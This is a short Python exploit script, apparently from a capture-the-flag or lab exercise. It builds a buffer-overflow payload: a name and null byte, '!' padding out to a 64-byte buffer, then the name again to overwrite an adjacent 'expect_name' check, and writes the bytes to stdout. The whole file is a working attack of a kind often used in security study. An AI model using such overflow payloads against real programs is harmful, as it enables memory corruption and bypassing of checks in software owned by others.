from struct import pack
import sys

name = b'xaq7pj'
bufferSize = 64

p = name + b'\x00' # name
p += (bufferSize - len(name) - 1)*b'!' # buffer overflow
p += name + b'\x00'  # expect_name 

sys.stdout.buffer.write(p)